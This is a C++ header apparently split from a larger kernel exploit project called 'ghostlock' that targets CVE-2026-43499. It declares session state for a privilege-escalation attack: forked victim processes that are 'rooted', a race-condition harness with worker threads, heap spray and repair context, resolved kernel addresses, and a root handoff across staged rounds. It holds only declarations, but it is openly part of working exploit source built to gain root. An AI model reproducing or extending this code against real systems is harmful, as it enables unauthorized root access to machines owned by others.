/**
 * @file session.h
 * @brief 43499 核心的按用途头（由 core.cpp 拆分，声明/内联逐字保留）。
 */
#ifndef GHOSTLOCK_CORE_SESSION_H
#define GHOSTLOCK_CORE_SESSION_H

#include "profile.h"
#include "memory.h"
#include "race.h"
#include "support.h"

/* ==== session/victim_context.hpp ==== */
#ifndef GHOSTLOCK_VICTIM_CONTEXT_HPP
#define GHOSTLOCK_VICTIM_CONTEXT_HPP


#include <sys/types.h>

#include <utility>

namespace ghostlock::session::victim {
    /* Owns the six pipe ends of the victim protocol plus the child pid for one
 * W2/W3 chain. The child-side ends are closed by the fork child before
 * child_main runs; the parent-side ends are closed once their protocol step
 * is done. parked_cmd_w receives the cmd write end by move when a rooted child
 * is parked across W3 rounds.
 *
 * Scope exit never signals the child: a rooted victim that reads EOF finishes
 * the root handoff on its own, so retirement is always explicit
 * (retire_child()) and handoff transfers the pid away (release_child()). */
    class VictimContext final {
    public:
        VictimContext() noexcept = default;

        ~VictimContext() noexcept = default;

        VictimContext(const VictimContext &) = delete;

        VictimContext &operator=(const VictimContext &) = delete;

        ghostlock::support::UniqueFd task_read;
        ghostlock::support::UniqueFd cmd_write;
        ghostlock::support::UniqueFd uid_read;
        ghostlock::support::UniqueFd task_write;
        ghostlock::support::UniqueFd cmd_read;
        ghostlock::support::UniqueFd uid_write;

        [[nodiscard]] pid_t child() const noexcept { return child_; }
        void set_child(pid_t child) noexcept { child_ = child; }
        /* waitpid() reaped the child; drop the pid without signalling it. */
        void mark_child_exited() noexcept { child_ = -1; }
        /* Transfer the pid to a handoff/parked owner. */
        [[nodiscard]] pid_t release_child() noexcept {
            return std::exchange(child_, -1);
        }

        /* Explicit SIGKILL + reap for a child this context still owns. */
        void retire_child() noexcept;

    private:
        pid_t child_ = -1;
    };
} // namespace ghostlock::session::victim

#endif
/* ==== session/exploit_session.hpp ==== */
#ifndef GHOSTLOCK_EXPLOIT_SESSION_HPP
#define GHOSTLOCK_EXPLOIT_SESSION_HPP


namespace ghostlock::session {
    /* Process-level owner for one exploit invocation. Route-local resources keep
 * their explicit disarm/destroy protocol because kernel references can outlive
 * userspace scopes; this object centralizes state without adding implicit
 * cleanup to the sensitive path.
 *
 * Per-field ownership contract (Batch 3.1). "Termination" is the point after
 * which every borrower must have stopped accessing the field; the session
 * itself outlives it. Auditable trace:
 *
 * | field | owner | created / acquired | borrowers | release / termination |
 * |---|---|---|---|---|
 * | `runtime` | session | `RuntimeConfig::init` at startup | config accessor users | value object; terminated at process end |
 * | `profile` | session | `attack::install_profile` (`TargetProfile::from`) | stages, read-only | value object; terminated at process end |
 * | `addresses` | session | address-space setup in `setup()` | attack/heap helpers, read-only | terminated at process end |
 * | `heap` | session | heap prepare / kernelsnitch during W1-W3 | spray and repair paths | released by the route cleanup after it reports clean; remainder at process end |
 * | `race` | session | `PiRace` set up per route (`race/threads.cpp`) | owner/waiter/consumer threads | normal path: `request_stop()` then successful joins before clearing the borrowed request. Deadline, reset-with-live-workers, or join failure uses `exit_group` without unwinding, so the borrowed stack object cannot end while a worker still accesses it. |
 * | `victim` | session | `victim_process` child/fd protocol | W2/W3 victim rounds | child retired or transferred at stage end; fds closed with the context |
 * | `parked_victim` / `parked_victim_cmd` | session | handoff parking | handoff probe | child signalled and fd closed at the late-load teardown |
 *
 * Component split: frontend (`root_child`) owns the victim/parked fields;
 * middleware (`tcp|select|multicast`) owns `race` plus its route-local disarms;
 * backend (`cve_2026_43499`) owns `heap`/`addresses`. No component stores private
 * scratch here. The field layout stays fixed so attack-function stack offsets do
 * not move. */
    struct ExploitSession final {
        ghostlock::config::RuntimeConfig runtime{};
        ghostlock::profile::TargetProfile profile{};
        memory::ResolvedAddresses addresses{};
        memory::HeapContext heap{};
        ghostlock::race::PiRace race{};
        /* SESSION-02: the victim protocol pipes live with the session; the
         * parked-child handoff state stays in run_exploit until the stage
         * machine lands. */
        victim::VictimContext victim{};
        /* SESSION-02: rooted victim parked for the late-load handoff. */
        pid_t parked_victim = -1;
        ghostlock::support::UniqueFd parked_victim_cmd{};

        ExploitSession()

            noexcept;

        ExploitSession(const ExploitSession &) = delete;

        ExploitSession &operator=(const ExploitSession &) = delete;
    };

    extern ExploitSession g_exploit_session;
} // namespace ghostlock::session

#endif
/* ==== session/stage_types.hpp ==== */
#ifndef GHOSTLOCK_STAGE_TYPES_HPP
#define GHOSTLOCK_STAGE_TYPES_HPP

#include <cstdint>

namespace ghostlock::session {
    /* Outcome of one orchestration stage. Failed maps to exit code 1, Continue
     * proceeds to the next stage and Done stops with exit code 0 (diagnostics). */
    enum class StageResult {
        Failed,
        Continue,
        Done,
    };

    /* Outcome of one W2/W3 victim round. */
    enum class VictimRound {
        Failed,
        Retry,
        Rooted,
    };

    /* State handed from the W2/W3 victim chain to the frontend handoff
     * (Batch 4 review P4). Ownership contract:
     *   - session.victim / session.parked_victim* are the authority for the
     *     child pid, its pipes and the parked child;
     *   - VictimChain is a single-threaded, transferred stage summary: written
     *     by the backend before run() returns it and read by the frontend
     *     afterwards on the same thread (ever_rooted = a child was rooted,
     *     seccomp_ok = W3 result, child_alive = last observation). The handoff
     *     still acts on the session's fds/pid; the chain only selects the path,
     *     so there is no stale-state window. If concurrency is ever introduced,
     *     the chain must become read-only accessors over the session. */
    struct VictimChain {
        int32_t child_alive = 1;
        int32_t seccomp_ok = 0;
        int32_t ever_rooted = 0;
    };

    using write_stage_verify_fn = int32_t (*)(void *context);
} // namespace ghostlock::session

#endif

#endif // GHOSTLOCK_CORE_SESSION_H
